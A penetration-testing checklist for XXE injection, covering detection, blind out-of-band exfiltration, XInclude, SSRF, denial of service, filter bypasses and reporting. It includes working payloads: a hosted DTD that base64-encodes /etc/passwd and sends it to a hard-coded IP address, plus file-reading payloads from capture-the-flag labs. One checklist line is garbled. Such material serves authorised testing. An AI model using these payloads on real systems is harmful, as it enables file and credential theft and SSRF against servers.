# XXE (XML External Entity) Injection

Use this checklist when testing for XML External Entity (XXE) injection vulnerabilities during penetration testing.

### Initial Reconnaissance

- [ ] Identify all endpoints that accept XML input (file uploads, API endpoints, SOAP services, etc.)
- [ ] Determine the XML parser being used (libxml2, Xerces, MSXML, etc.)
- [ ] Check if the application processes XML in any way (configuration files, data exchange, document processing)
- [ ] Review client-side code for XML processing functionality

### Basic XXE Detection

- [ ] Test with a simple external entity declaration to retrieve local files (e.g., /etc/passwd, C:\windows\win.ini)
- [ ] Verify if DOCTYPE declarations are processed
- [ ] Check if SYSTEM entities are resolved
- [ ] Test if PUBLIC entities are supported
- [ ] Attempt to trigger error messages that reveal file contents or system information

### Blind XXE Testing

- [ ] Test for out-of-band XXE using external DTD references to your controlled server

Host dtd.xml

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://129.212.189.27/dtd.xml?%data;'>">
```

Now use the following:

```xml
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://129.212.189.27:8000/dtd.xml">
%sp;
%param1;
]>
```

- [ ] Monitor for DNS queries to your domain when testing blind XXE
- [ ] Check for HTTP requests to your server when external entities are processed
- [ ] Test parameter entity injection for blind XXE exploitation
- [ ] Attempt to exfiltrate data via DNS (chunked data in subdomain queries)

### Xinclude

From Tanuki (XInclude) on Bugforge

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<deck xmlns:xi="http://www.w3.org/2001/XInclude">
<name>Test</name>
<description><xi:include parse="text" href="file://flag.txt"/></description>
<category>test</category>
<cards>
<card>
<front>Test front</front>
<back>Test back</back>
</card>
</cards>
</deck>
```

### File Retrieval Attacks

- [ ] Try to access sensitive local files (/etc/shadow, web.config, application.properties, etc.)
- [ ] Attempt to read source code files
- [ ] Test for directory traversal combined with XXE
- [ ](e.g.,%20[http://169.254.169.254/latest/meta-data/))
- [ ] Attempt to retrieve Windows credential files (SAM, SYSTEM hives)

### SSRF via XXE

- [ ] Test for Server-Side Request Forgery by targeting internal network resources
- [ ] Attempt to scan internal ports using XXE
- [ ] Try to access internal services and APIs
- [ ] Test connectivity to localhost services on various ports
- [ ] Attempt to exploit internal services through XXE-based SSRF

### Denial of Service (DoS)

- [ ] Test for Billion Laughs attack (recursive entity expansion)
- [ ] Attempt external entity expansion to cause resource exhaustion
- [ ] Try to reference extremely large files to consume server resources
- [ ] Test for quadratic blowup attacks with nested entities

### Advanced Exploitation

- [ ] Test XXE in different content types (SOAP, SVG, DOCX, XLSX, PDF, etc.)
- [ ] Check for XXE in file upload functionality (especially office documents)
- [ ] Test XInclude attacks when direct entity injection is blocked
- [ ] Attempt XXE through modified content-type headers (e.g., changing JSON to XML)
- [ ] Test for XXE in SAML assertions and responses
- [ ] Check for XXE in RSS/ATOM feeds

### Bypass Techniques

- [ ] Try different encodings (UTF-16, UTF-7) to bypass filters
- [ ] Test with alternative protocols (file://, http://, ftp://, gopher://, jar://)
- [ ] Attempt to bypass WAF/filters using XML entity obfuscation
- [ ] Try nested entity declarations to evade detection
- [ ] Test with external DTD hosted on your server to bypass inline restrictions

### Documentation and Reporting

- [ ] Document all vulnerable endpoints and parameters
- [ ] Record proof-of-concept payloads that successfully exploited XXE
- [ ] Assess the impact and sensitivity of data accessible through XXE
- [ ] Determine if other attack vectors are accessible through XXE (SSRF, RCE, etc.)
- [ ] Provide remediation recommendations (disable external entities, use safe parsers, input validation)

Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="/sitemap.xsl"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1">
    <url>
        <loc>&test;</loc>
        <priority>1.0</priority>
    </url>
    <url>
        <loc>https://www.google.com/test</loc>
        <priority>1.0</priority>
    </url>
    <url>
        <loc>https://www.google.com/test-2</loc>
        <priority>1.0</priority>
    </url>
</urlset>
```
